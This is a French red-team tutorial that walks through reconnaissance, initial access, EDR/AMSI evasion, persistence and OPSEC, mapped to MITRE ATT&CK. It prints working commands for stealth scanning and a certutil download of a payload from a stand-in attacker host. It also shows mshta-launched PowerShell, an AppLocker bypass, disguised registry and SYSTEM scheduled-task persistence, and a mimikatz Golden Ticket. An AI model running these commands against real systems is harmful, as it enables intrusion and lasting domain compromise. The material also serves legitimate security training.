Introduction au Red Teaming

Le Red Teaming simule des attaques réalistes pour évaluer la posture de sécurité d'une organisation. Contrairement aux pentests traditionnels, les opérations Red Team mettent l'accent sur l'OPSEC (sécurité opérationnelle) et l'évasion des défenses.

Red Team vs Pentest : Le pentest cherche à trouver un maximum de vulnérabilités. Le Red Team simule un adversaire réaliste avec des objectifs précis (exfiltration de données, accès à un système critique).

Phase 1 : Reconnaissance

La reconnaissance est la phase la plus critique. Elle détermine le succès de l'opération entière.

Reconnaissance passive (OSINT)

Technique MITRE ID Outils
Gather Victim Identity Info T1589 theHarvester, LinkedIn, Hunter.io
Search Open Technical Databases T1596 Shodan, Censys, crt.sh
Search Victim-Owned Websites T1594 Wayback Machine, Google Dorks 
# Exemple : Énumération de sous-domaines
subfinder -d target.com -silent | httpx -silent | nuclei -t cves/

# Google Dorks pour fichiers sensibles
site:target.com filetype:pdf | filetype:xlsx | filetype:docx
site:target.com inurl:admin | inurl:login | inurl:portal

Reconnaissance active

La reconnaissance active laisse des traces. Utiliser des proxies et varier les User-Agents.

# Scan Nmap discret
nmap -sS -T2 --randomize-hosts -D RND:10 target.com

# Énumération web avec gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 --delay 100ms

Phase 2 : Initial Access

L'accès initial est le moment le plus risqué. Les vecteurs courants incluent :

Technique MITRE ID Description
Phishing: Spearphishing Attachment T1566.001 Documents Office avec macros, fichiers ISO/LNK
Exploit Public-Facing Application T1190 Vulnérabilités web, VPN, services exposés
Valid Accounts T1078 Credentials stuffing, password spraying
Drive-by Compromise T1189 Watering hole, exploitation navigateur
Tendance 2025 : Les attaquants privilégient les fichiers ISO/IMG contenant des LNK malveillants, car ils contournent la Mark-of-the-Web (MOTW).

Phase 3 : Execution & Evasion

L'évasion des EDR/AV est au cœur des opérations Red Team modernes.

Techniques d'évasion

  • AMSI Bypass : Patcher amsi.dll en mémoire avant d'exécuter du PowerShell
  • ETW Patching : Désactiver Event Tracing for Windows pour éviter la télémétrie
  • Direct Syscalls : Appeler les syscalls NT directement, sans passer par ntdll.dll
  • API Unhooking : Restaurer les fonctions hookées par l'EDR
  • Process Injection : Injecter du code dans des processus légitimes
// Exemple simplifié : Direct Syscall (NtAllocateVirtualMemory)
// Au lieu d'appeler VirtualAlloc -> kernel32 -> ntdll -> syscall
// On appelle directement le syscall

mov r10, rcx
mov eax, 0x18      ; Numéro syscall NtAllocateVirtualMemory (varie selon Windows)
syscall
ret

Living Off The Land (LOLBins)

Utiliser des binaires Windows légitimes pour éviter la détection :

# Téléchargement via certutil
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe

# Exécution via mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(...)"", 0:close")

# Bypass AppLocker via MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

Phase 6 : Persistence

La persistence assure le maintien de l'accès même après un reboot ou une réponse incident partielle.

Technique MITRE ID Localisation
Registry Run Keys T1547.001 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Scheduled Task T1053.005 Task Scheduler
Create Account T1136 Utilisateur local/domaine caché
Server Software Component: Web Shell T1505.003 Serveurs web compromis
Boot or Logon Autostart: Startup Folder T1547.001 %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup 
# Persistence via Registry (détectable)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\update.exe"

# Scheduled Task (plus discret)
schtasks /create /tn "MicrosoftEdgeUpdateCore" /tr "C:\Users\Public\update.exe" /sc onlogon /ru SYSTEM

# Golden Ticket (persistence domaine ultime)
# Nécessite le hash KRBTGT
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt
Golden Ticket — Un Golden Ticket reste valide jusqu'à ce que le mot de passe KRBTGT soit changé deux fois. C'est la persistence la plus puissante sur un domaine AD.

OPSEC : Règles d'or

  1. Blending in : Imiter le trafic réseau légitime (horaires de bureau, User-Agents réalistes)
  2. Minimiser l'empreinte : Éviter d'écrire sur disque, utiliser le reflective loading
  3. Segmenter l'infrastructure : Redirecteurs → Team servers → Backend
  4. Chiffrer tout : Communications C2, données exfiltrées
  5. Surveiller les IOCs : Vérifier régulièrement si votre infrastructure est flaggée
  6. Kill dates : Implants qui s'auto-détruisent après une date limite
